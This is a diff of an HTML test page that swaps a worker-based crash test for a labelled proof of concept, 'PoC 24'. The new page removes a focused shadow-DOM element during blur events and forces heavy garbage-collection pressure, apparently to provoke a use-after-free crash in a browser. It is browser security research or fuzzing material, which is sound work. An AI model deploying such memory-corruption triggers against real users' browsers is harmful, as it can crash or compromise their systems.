@@ -1,57 +1,52 @@
 <!DOCTYPE html>
-
 <html>
 <body>
-
-<div id="result">Running...</div>
-
+<p>PoC 24 - GC pesado + loop</p>
+<div id="host"></div>
+<div id="result"></div>
 <script>
-const WORKER_SOURCE = `
-self.onmessage = event => {
-    const processor = new MediaStreamTrackProcessor({ track: event.data });
-
-    function overflowStack() {
-        try {
-            overflowStack();
-        } catch {
-            try {
-                processor.readable;
-            } catch {
-                self.postMessage("done");
-            }
-        }
+function gc() {
+    function gcRec(n) {
+        if (n < 1) return {};
+        var temp = {i: "ab" + i + (i / 100000)};
+        temp += "foo";
+        gcRec(n-1);
     }
-
-    overflowStack();
-};
-`;
-
-const WORKER_URL = URL.createObjectURL(
-    new Blob([WORKER_SOURCE], { type: "text/javascript" })
-);
-
-async function runTest() {
-    const canvas = document.createElement("canvas");
-
-    const stream = canvas.captureStream(30);
-    const track = stream.getVideoTracks()[0];
-
-    const worker = new Worker(WORKER_URL);
-
-    worker.postMessage(track);
-
-    await new Promise(resolve => {
-        worker.onmessage = resolve;
-    });
-
-    worker.terminate();
-
-    document.getElementById("result").textContent =
-        "PASS if it does not crash.";
+    for (var i = 0; i < 20000; i++) gcRec(12);
+    // pressão extra de memória
+    let junk = [];
+    for (let i = 0; i < 50; i++) junk.push(new ArrayBuffer(1024*1024));
 }
 
-runTest();
-</script>
+let shadowRoot = host.attachShadow({ mode: 'open' });
+let victim = document.createElement('div');
+victim.tabIndex = 0;
+victim.textContent = 'Focusable';
+shadowRoot.appendChild(victim);
+victim.focus();
 
+let killed = false;
+function kill() {
+    if (killed || !victim) return;
+    killed = true;
+    victim.remove();
+    victim = null;
+    gc();
+}
+
+document.addEventListener('blur', kill, true);
+window.addEventListener('blur', kill, true);
+
+setTimeout(() => {
+    for (let i = 0; i < 5; i++) {
+        try { window.blur(); } catch(e) {}
+        try {
+            let w = window.open('about:blank','_blank','width=20,height=20');
+            if (w) { w.focus(); w.close(); }
+        } catch(e) {}
+    }
+    setTimeout(() => result.textContent = 'PASS', 400);
+}, 50);
+</script>
 </body>
 </html>
